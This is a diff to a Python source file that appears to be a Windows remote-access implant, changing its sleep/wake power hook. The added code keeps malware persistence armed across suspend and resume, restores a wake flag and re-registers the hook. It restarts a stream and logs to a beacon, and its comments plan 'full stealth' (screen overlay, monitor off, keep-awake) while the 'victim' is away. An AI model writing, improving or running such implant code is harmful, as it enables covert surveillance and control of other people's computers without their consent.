@@ -2400,13 +2400,15 @@ def _power_hook() -> None:
                     ("lpszMenuName", ctypes.c_wchar_p),
                     ("lpszClassName", ctypes.c_wchar_p)]
 
-    last_resume = [0.0]   # some power plans deliver >1 PBT_APMRESUME* per wake
+    last_resume = [0.0]      # some power plans deliver >1 PBT_APMRESUME* per wake
+    _wake_pre_suspend = [False]   # wake-armed state captured at suspend time
 
     def proc(hwnd, msg, wp, lp):
         if msg == WM_POWERBROADCAST:
             try:
                 if wp == PBT_APMSUSPEND:
-                    if _wake_armed():
+                    _wake_pre_suspend[0] = _wake_armed()
+                    if _wake_pre_suspend[0]:
                         # wake +1min: re-register with a one-shot timer so the
                         # machine comes back even if the victim never returns
                         ok = _register_wake_task(_persistence_exe(), 1,
@@ -2421,9 +2423,43 @@ def _power_hook() -> None:
                         return 1
                     last_resume[0] = now
                     time.sleep(2.0)      # let Task Scheduler settle after wake
-                    _q_on_resume()   # drop stale session; restart stream
-                    if _wake_armed():
-                        rearm = _wake_rearm()
+                    # Re-register the sleep/wake hook on EVERY wake, first and
+                    # on its own, so a later hiccup (stream restart, stealth)
+                    # can never leave the next sleep cycle armed once only.
+                    # Also heal a wake flag that vanished while the machine
+                    # was asleep, so repeat admin sleep-stealth stays armed.
+                    armed = _wake_armed() or _wake_pre_suspend[0]
+                    if armed and not _wake_armed():
+                        try:
+                            with open(_wake_flag(), "w") as f:
+                                f.write("1")
+                            _beacon_log("[power] resume: wake flag restored")
+                        except OSError as e:
+                            _beacon_log("[power] resume: flag restore "
+                                        "FAILED: %s" % e)
+                    if armed:
+                        try:
+                            rearm = _wake_rearm()
+                        except Exception:
+                            rearm = False
+                        _beacon_log("[power] resume (wake armed): hook "
+                                    "re-registered=%s"
+                                    % ("ok" if rearm else "FAILED"))
+                        if not rearm:
+                            try:
+                                if _wake_rearm():
+                                    rearm = True
+                                    _beacon_log("[power] resume: hook "
+                                                "re-register retry ok")
+                            except Exception:
+                                pass
+                    else:
+                        _beacon_log("[power] resume (wake not armed)")
+                    try:
+                        _q_on_resume()   # drop stale session; restart stream
+                    except Exception as e:
+                        _beacon_log("[power] resume: _q_on_resume error: %s" % e)
+                    if armed:
                         if _idle_seconds() > 30:   # victim still away
                             # full stealth: overlay + monitor off + keep-awake,
                             # auto-exits on the victim's physical input
@@ -2437,8 +2473,6 @@ def _power_hook() -> None:
                             _beacon_log("[power] resume (wake armed, user "
                                         "present): rearm=%s, staying visible"
                                         % ("ok" if rearm else "FAILED"))
-                    else:
-                        _beacon_log("[power] resume (wake not armed)")
             except Exception:
                 pass
             return 1
